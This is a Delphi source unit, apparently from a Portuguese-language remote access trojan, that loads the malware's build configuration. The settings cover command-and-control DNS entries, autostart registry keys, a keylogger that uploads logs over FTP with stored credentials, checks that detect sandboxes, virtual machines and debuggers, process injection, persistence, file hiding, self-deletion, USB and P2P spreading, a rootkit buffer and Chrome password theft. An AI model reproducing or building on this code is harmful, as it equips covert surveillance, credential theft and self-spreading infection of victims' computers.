unit UnitSettings;

interface

uses
  windows;

var
  DNS: array [0..19] of string;
  Identificacao,
  Senha: string;
  InstalarServidor: boolean;
  OndeInstalar: integer;
  OndeInstalarOpcional,
  OndeInstalarComplemento,
  NomeArquivoInstalacao,
  ActiveX,
  HKLM,
  HKCU,
  Policies: string;
  ExibirMensagem: boolean;
  IconeMSG,
  BotaoMSG: integer;
  TituloMSG,
  TextoMSG: string;
  KeyloggerAtivo,
  ExcluirBACKSPACE,
  EnviarPorFTP: boolean;
  FTPAddress,
  FTPdir,
  FTPuser,
  FTPpass: string;
  FTPport,
  LogMinute: integer;
  AntiSandieBox,
  AntiVPC,
  AntiVMWare,
  AntiVirtualBox,
  AntiThreatExpert,
  AntiAnubis,
  AntiCWSandbox,
  AntiJoeBox,
  AtiNormamSandbox,
  AntiSoftIce,
  AntiDebugger,
  Outros: boolean;
  WhereInject: integer;
  InjectIntoString: string;
  Persist,
  HideFile,
  ChangeDate: boolean;
  MutexName: string;
  MeltOriginalFile: boolean;
  MD5plugin: string;
  Versao: string;
  BindedFiles: string;
  p2pnames: string;
  usbspreader: boolean;
  RootKITBuffer: string;
  ChromePassLink: string;
  ChromePassReady: boolean = false;
  ChromeFile: string;

  // Manter por penúltimo que sempre será a penúltima variável ---> variaveis[99]
  PluginBuffer: string;
  // Manter por último que sempre será a última variável ---> variaveis[100]
  ServerBuffer: string;







   // a partir daqui são variáveis não pertencentes ao loader
   FirstExecuteFileName: string;
   ServerFilename: string;
   PersistFileName: string;
   KeyloggerThread: THandle = 0;
   NewIdentification: string;
   RandomStringClient: string;
   MainMutex: THandle;
   MainMutexRootKIT: THandle;
   ExitMutex: THandle;
   ProxyMutex: THandle;
   PersistMutex: THandle;

procedure GetFirstSettings;

implementation

uses
  UnitVariaveis,
  UnitComandos,
  UnitServerUtils;

procedure GetFirstSettings;
var
  i: integer;
begin
  for i := 0 to 19 do DNS[i] := variaveis[i];
  Identificacao := variaveis[20];
  Senha := variaveis[21];
  InstalarServidor := strtobool(variaveis[22]);
  OndeInstalar := strtoint(variaveis[23]);
  OndeInstalarOpcional := variaveis[24];
  OndeInstalarComplemento := variaveis[25];
  NomeArquivoInstalacao := variaveis[26];
  ActiveX := variaveis[27];
  HKLM := variaveis[28];
  HKCU := variaveis[29];
  ExibirMensagem := strtobool(variaveis[30]);
  IconeMSG := strtoint(variaveis[31]);
  BotaoMSG := strtoint(variaveis[32]);
  TituloMSG := variaveis[33];
  TextoMSG := variaveis[34];
  KeyloggerAtivo := strtobool(variaveis[35]);
  ExcluirBACKSPACE := strtobool(variaveis[36]);
  EnviarPorFTP := strtobool(variaveis[37]);
  FTPAddress := variaveis[38];
  FTPdir := variaveis[39];
  //SMTPserver := variaveis[40]; era usado por email
  FTPuser := variaveis[41];
  FTPpass := variaveis[42];
  FTPport := strtoint(variaveis[43]);
  LogMinute := strtoint(variaveis[44]);
  AntiSandieBox := strtobool(variaveis[45]);
  AntiVPC := strtobool(variaveis[46]);
  AntiVMWare := strtobool(variaveis[47]);
  AntiVirtualBox := strtobool(variaveis[48]);
  AntiThreatExpert := strtobool(variaveis[49]);
  AntiAnubis := strtobool(variaveis[50]);
  AntiCWSandbox := strtobool(variaveis[51]);
  AntiJoeBox := strtobool(variaveis[52]);
  AtiNormamSandbox := strtobool(variaveis[53]);
  AntiSoftIce := strtobool(variaveis[54]);
  AntiDebugger := strtobool(variaveis[55]);
  Outros := strtobool(variaveis[56]);
  WhereInject := strtoint(variaveis[57]);
  InjectIntoString := variaveis[58];
  Persist := strtobool(variaveis[59]);
  HideFile := strtobool(variaveis[60]);
  ChangeDate := strtobool(variaveis[61]);
  MutexName := variaveis[62];
  MeltOriginalFile := strtobool(variaveis[63]);
  MD5plugin := variaveis[64];
  versao := variaveis[65];
  // 66 e 67 era usado quando enviava plugin
  BindedFiles := variaveis[68];
  Policies := variaveis[69];
  usbspreader := strtobool(variaveis[70]);
  p2pnames := variaveis[71];
  RootKITBuffer := variaveis[72];
  ChromePassLink := variaveis[73];
  DebugAtivoServer := strtobool(variaveis[74]);

  PluginBuffer := variaveis[99];
  ServerBuffer := variaveis[100];
end;

end.